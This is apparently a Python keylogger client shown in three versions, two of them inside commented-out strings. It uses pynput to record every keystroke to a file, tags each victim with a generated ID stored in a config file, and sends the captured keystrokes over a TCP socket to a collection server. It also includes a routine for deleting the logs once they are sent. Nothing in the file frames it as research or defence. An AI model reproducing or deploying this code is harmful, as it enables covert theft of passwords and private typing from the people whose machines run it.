"""import pynput
import time

COUNT = 1
FILE = []

def getID():
    return 123456789

def writeFile():
    global COUNT
    global FILE
    start_time = time.time()  # Record the start time
    
    try:
        file_name = f"{getID()}_{COUNT}.txt"
        with open(file_name, 'w') as f:
            FILE.append(file_name)

            def on_press(key):
                try:
                    f.write(key.char)
                except AttributeError:
                    f.write(f"[{key}]")
                
                # Check elapsed time
                if time.time() - start_time >= 10:  # 60 seconds = 1 minute
                    return False  # Returning False stops the listener

            # Create the listener
            listener = pynput.keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()  # This will block until the listener is stopped or 1 minute is elapsed

    except Exception as e:
        print(f"An error occurred during writing key logger: {e}")
    finally:
        f.close()  # Close the file after the listener has finished

if __name__ == "__main__":
    writeFile()
"""




"""import pynput
import socket
import time

COUNT = 1
FILE = []

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 55556

def getID():
    return 123456789

def writeFile():
    global COUNT
    global FILE
    file_name = f"{getID()}_{COUNT}.txt"
    FILE.append(file_name)
    
    try:
        with open(file_name, 'w') as f:
            def on_press(key):
                try:
                    f.write(key.char)
                except AttributeError:
                    f.write(f"[{key}]")

            # Create the listener
            with pynput.keyboard.Listener(on_press=on_press) as listener:
                while True:
                    time.sleep(1)  # Sleep for 1 second before attempting connection

                    try:
                        # Try to connect to the server
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.connect((SERVER_HOST, SERVER_PORT))
                            print("Connected to server")

                            # Send the file to the server
                            with open(file_name, 'rb') as file:
                                data = file.read(1024)
                                while data:
                                    s.sendall(data)
                                    data = file.read(1024)
                                print("File sent successfully")
                            break  # Break out of the loop once file is sent

                    except ConnectionRefusedError:
                        print("Server not reachable. Continuing to capture keystrokes.")
                    except Exception as e:
                        print(f"An error occurred during connection to server: {e}")

                listener.stop()  # Stop capturing keystrokes

    except Exception as e:
        print(f"An error occurred during writing key logger: {e}")

if __name__ == "__main__":
    writeFile()

"""


import os
import pynput
import socket
import time
import uuid
import configparser
import socket
import time


BUFFER_SIZE = 1024

COUNT = 1
#array with created keylogger file still existing
FILE = []

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 55556
CLIENT_CONFIG_FILE = "client_config.ini"
IP_CLIENT = None
configFile = configparser.ConfigParser()

def setID():
    clientID = str(uuid.uuid4())
    configFile['Client'] = {'ID': clientID}
    try:
        with open(CLIENT_CONFIG_FILE, 'w') as file:
            configFile.write(file)
    except IOError as e:
        print(f"An error occurred while writing: {e}")
    except Exception as e:
        print(f"An error occurred setting ID: {e}")
    print(f"[*] Assigned ID: {clientID}")
    return clientID


def getID():
    try:
        configFile.read(CLIENT_CONFIG_FILE)
        return configFile.get("Client", "ID")
    except (configparser.NoSectionError, configparser.NoOptionError, FileNotFoundError):
        return setID()


def deleteFile(nameFile):
    global FILE
    print("A file is going to be deleted..")
    try:
        os.remove(nameFile)
        FILE.pop(0)
        print(f"File '{nameFile}' has been deleted successfully\n")
    except FileNotFoundError:
        print(f"File '{nameFile}' has not been found")
    except Exception as e:
        print(f"An error occurred while deleting the file: {e}")

def sendFile(socket):
    global FILE
    print("A file is going to be sent to the server..")
    try:
        nameFile = FILE[0]
        with open(nameFile, 'rb') as f:
            fileToSent = f.read()
        socket.sendall(f"{nameFile}\n".encode() + fileToSent)
        print(f"The file '{nameFile}' has been sent to the server\n") 
        return nameFile    
    except Exception as e:
        print(f"An error occurred while sending file: {e}")



def connectionServer(s):
    try:
        id = getID().encode()
        s.sendall(id)
        data = s.recv(BUFFER_SIZE)
        print(f"Response from the SERVER : '{data.decode()}'\n")

        while True:
            nameFile = sendFile(s)
            data = s.recv(BUFFER_SIZE)
            print(f"Response from the SERVER : '{data.decode()}'\n")
            #deleteFile(nameFile)
            break
    except ConnectionRefusedError:
        print("Server not available. Retrying in 5 seconds..")
        time.sleep(5)
    except Exception as e:
        print(f"An error occurred while connected to server: {e}")


def writeFile():
    global COUNT
    global FILE
    file_name = f"{getID()}_{COUNT}.txt"
    FILE.append(file_name)
    
    try:
        with open(file_name, 'w') as f:
            def on_press(key):
                try:
                    f.write(key.char)
                except AttributeError:
                    f.write(f"[{key}]")

            # Create the listener
            with pynput.keyboard.Listener(on_press=on_press) as listener:
                while True:
                    time.sleep(1)  # Sleep for 1 second before attempting connection

                    try:
                        # Try to connect to the server
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.connect((SERVER_HOST, SERVER_PORT))
                            print("Connected to server")
                            return True  # Return True if connected successfully

                    except ConnectionRefusedError:
                        print("Server not reachable. Continuing to capture keystrokes.")
                    except Exception as e:
                        print(f"An error occurred during connection to server: {e}")

                listener.stop()  # Stop capturing keystrokes
                return False  # Return False if connection failed

    except Exception as e:
        print(f"An error occurred during writing key logger: {e}")
        return False


def main():
    if writeFile():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))
        connectionServer(s)
    else:
        print("Connection failed.")




if __name__ == "__main__":
    main()




